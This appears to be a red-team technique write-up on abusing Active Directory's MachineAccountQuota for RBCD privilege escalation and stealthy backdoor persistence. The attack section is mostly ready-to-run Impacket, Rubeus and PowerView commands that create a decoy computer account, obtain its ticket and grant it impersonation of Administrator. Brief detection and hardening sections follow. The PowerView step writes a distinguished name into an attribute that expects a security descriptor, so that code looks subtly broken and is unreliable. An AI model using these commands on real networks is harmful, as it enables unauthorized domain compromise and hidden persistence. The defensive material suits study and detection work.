# [PE-CREATE-002]: MachineAccountQuota > 0 Exploitation (Weaponization)

## Metadata
| Attribute | Details |
|---|---|
| **Technique ID** | PE-CREATE-002 |
| **MITRE ATT&CK v18.1** | [Account Manipulation (T1098)](https://attack.mitre.org/techniques/T1098/) |
| **Tactic** | Privilege Escalation / Persistence |
| **Platforms** | Windows AD |
| **Severity** | **High** |
| **Author** | SERVTEP (Pchelnikau Artur) |

## 2. EXECUTIVE SUMMARY
- **Concept:** This module focuses on the *operational weaponization* of the Machine Account Quota. While PE-CREATE-001 discusses the flaw, this module details the specific exploit paths enabled by it. Specifically, we use the created machine account to act as a **Pivot** for S4U (Service for User) attacks or as a **Persistence** mechanism (Backdoor Computer). A machine account is often less monitored than a user account, making it ideal for long-term access.
- **Attack Surface:** AD Computer Objects.
- **Business Impact:** **Stealthy Persistence**.

## 3. PREREQUISITES & CONFIGURATION
- **Required Privileges:** Any User (MAQ > 0).
- **Tools:**
    - [Impacket](https://github.com/fortra/impacket) (`addcomputer.py`)
    - [Rubeus](https://github.com/GhostPack/Rubeus)

## 4. ATTACK (Red Team Operations)

#### 4.1 Usage
**Step 1: Create Account (Python)**
If you are on Linux (e.g., pivoted via SOCKS):
```bash
python3 addcomputer.py -computer-name 'BackupServer$' -computer-pass 'Winter2025!' domain.local/user:password -dc-ip 192.168.1.10
```

**Step 2: Authenticate**
Obtain a TGT for the new machine.
```cmd
Rubeus.exe asktgt /user:BackupServer$ /password:Winter2025! /domain:domain.local /ptt
```

**Step 3: Attack (RBCD Example)**
If you have `WriteProperty` on a target server (`FileShare`), configure it to trust your new machine.
```powershell
# (Using PowerView)
$Target = Get-DomainComputer FileShare
$Attacker = Get-DomainComputer BackupServer
Set-DomainObject -Identity $Target.distinguishedName -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity'=$Attacker.distinguishedName}
```
*Now `BackupServer$` can impersonate Administrator to `FileShare`.*

## 5. DETECTION (Blue Team Operations)

#### 5.1 AD Logs
| Source | Event | Filter Logic |
|---|---|---|
| **Security** | 4741 | Look for computer accounts created with names that don't match naming conventions (e.g., random characters or mimicking critical servers). |
| **Security** | 4769 | Ticket requests from machine accounts that have never logged in before (First use). |

## 6. DEFENSE & REMEDIATION (Hardening)

#### 6.2 Immediate Remediation
*   **MAQ=0:** See PE-CREATE-001.
*   **Audit New Computers:** Alert on any computer creation that does not originate from the provisioning OU or service account.

## 7. ATTACK CHAIN
> **Preceding Technique:** [PE-CREATE-001]
> **Next Logical Step:** [PE-TOKEN-002]
